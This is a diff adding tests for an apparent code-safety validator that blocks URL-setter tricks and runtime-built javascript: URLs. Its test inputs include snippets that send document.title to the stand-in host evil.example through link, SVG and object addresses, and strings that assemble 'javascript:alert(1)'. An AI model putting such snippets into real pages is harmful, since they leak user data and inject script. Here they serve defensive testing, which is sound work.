@@ -760,3 +760,109 @@ describe('audit of 00cc5f7 (#48): CSS escapes and style paths', () => {
     }
   })
 })
+
+describe('audit of 00cc5f7 (#48): URL setters and runtime javascript: URLs', () => {
+  const SNIPPETS = [
+    `const a = document.querySelector('a[href]'); a.hostname = 'evil.example'; a.search = '?' + document.title; a.click()`,
+    `document.querySelector('svg image').href.baseVal = 'https://evil.example/?' + document.title`,
+    `document.querySelector('object').data = 'https://evil.example/?' + document.title`,
+  ]
+  for (const snippet of SNIPPETS) {
+    it(`blocks: ${snippet}`, () => {
+      expect(blocks(snippet)).toBe(true)
+    })
+  }
+
+  it('blocks a runtime-built javascript: URL even when network is declared (gap 7)', () => {
+    const snippet = `const p = 'java'; const a = document.createElement('a'); a.href = p + 'script:al' + 'ert(1)'; document.body.append(a); a.click()`
+    expect(blocks(snippet, ['network'])).toBe(true)
+  })
+
+  it('refuses every address part of a link, a form action and a frame, which can change where it goes', () => {
+    for (const name of ['hostname', 'host', 'protocol', 'pathname', 'search', 'hash', 'port', 'username', 'password']) {
+      expect(blocks(`document.querySelector('a').${name} = 'x'`), name).toBe(true)
+      expect(blocks(`document.querySelector('a').${name} += 'x'`), name).toBe(true)
+      expect(blocks(`document.querySelector('a')['${name}'] = 'x'`), name).toBe(true)
+      // Declared network use unlocks a part, as it unlocks href.
+      expect(blocks(`document.querySelector('a').${name} = 'x'`, ['network']), name).toBe(false)
+    }
+  })
+
+  it('refuses the SVG address forms and object data', () => {
+    for (const source of [
+      `document.querySelector('svg image').href.animVal = 'https://evil.example/'`,
+      `document.querySelector('svg image').href.baseVal = '#a'`,
+      `document.querySelector('object').data = '/x'`,
+      `document.querySelectorAll('object')[0].data = '/x'`,
+      `document.getElementsByTagName('object')[0].data = '/x'`,
+      `const o = document.querySelector('object'); o.data += 'x'`,
+      `Object.assign(document.querySelector('object'), { data: '/x' })`,
+      `const el = document.body; el.data = 'x'`,
+    ]) {
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('refuses a URL write whose value is not provably free of javascript:, whatever is declared', () => {
+    for (const source of [
+      `const a = document.body; a.href = a.title`,
+      `const a = document.body; const u = a.title; a.href = u`,
+      `const a = document.body; a.href = 'java' + 'script:alert(1)'`,
+      `const a = document.body; a.href = '' + a.title`,
+      `const a = document.body; a.href = \`\${a.title}x\``,
+      `const a = document.body; a.href = a.title + '/x'`,
+      `const a = document.body; a.href += '/x'`,
+      `const a = document.body; a.href = 'ht' + a.title`,
+      `const a = document.body; a.href = 'java\\tscript:alert(1)'`,
+      `const a = document.body; a.setAttribute('href', a.title)`,
+      `const a = document.body; const p = 'java'; a.setAttribute('href', p + 'script:alert(1)')`,
+      `const a = document.body; a.setAttribute('xlink:href', a.title)`,
+      `const f = document.createElement('form'); f.action = 'x'`,
+      `const a = document.body; Object.assign(a, { href: a.title })`,
+      `const a = document.body; a.formAction = a.title`,
+      `const a = document.body; a.src = a.title`,
+      `const a = document.body; const c = a.title ? 'a' : a.id; a.href = c`,
+    ]) {
+      expect(blocks(source, ['network']), source).toBe(true)
+    }
+  })
+
+  it('controls: a written-out address prefix passes with network declared, and not without it', () => {
+    for (const source of [
+      `const a = document.body; a.href = 'https://example.com/a'`,
+      `const a = document.body; a.href = 'https://example.com/' + a.id`,
+      `const a = document.body; a.href = '/path/' + encodeURIComponent(a.title)`,
+      `const a = document.body; a.href = \`https://example.com/\${a.id}\``,
+      `const a = document.body; a.href = a.id ? 'https://a.example/' : '/b'`,
+      `const a = document.body; a.href = '#top'`,
+      `const a = document.body; a.href = '?q=' + a.id`,
+      `const a = document.body; a.href = ''`,
+      `const a = document.body; a.setAttribute('href', 'https://example.com/' + a.id)`,
+      `const a = document.body; Object.assign(a, { href: '/x/' + a.id })`,
+    ]) {
+      expect(blocks(source, ['network']), source).toBe(false)
+      expect(blocks(source), source).toBe(true)
+    }
+  })
+
+  it('controls: URL objects, text nodes and plain reads of these names still pass', () => {
+    for (const source of [
+      `const u = new URL('https://example.com/a'); u.search = '?x=1'; u.hash = '#y'; u.pathname = '/z'`,
+      `const u = new URL('https://example.com/a'); u.hostname = 'example.org'; u.href`,
+      `const t = document.createTextNode('x'); t.data = 'y'; t.data += 'z'`,
+      `document.createTextNode('a').data = 'b'`,
+      `const t = new Text('a'); t.data = 'b'`,
+      `const c = document.createComment('a'); c.data = 'b'`,
+      `const a = document.querySelector('a'); const h = a.hostname, p = a.pathname, s = a.search, x = a.hash, d = a.data`,
+      `const o = { host: 'a', search: 'b', data: 'c', hash: 'd' }; o.host`,
+    ]) {
+      expect(blocks(source), source).toBe(false)
+    }
+    // A plain object written in the code holds no address, but only while
+    // every write to its name is such an object.
+    expect(blocks(`const o = { search: 'a', data: 'c' }; o.search = 'b'; o.data = 'd'`)).toBe(false)
+    expect(blocks(`let o = { search: 'a' }; o = document.body; o.search = 'b'`)).toBe(true)
+    expect(blocks(`let o = { data: 'a' }; o = document.querySelector('object'); o.data = 'b'`)).toBe(true)
+    expect(blocks(`const n = document.querySelector('p').firstChild; n.data = 'x'`)).toBe(true)
+  })
+})
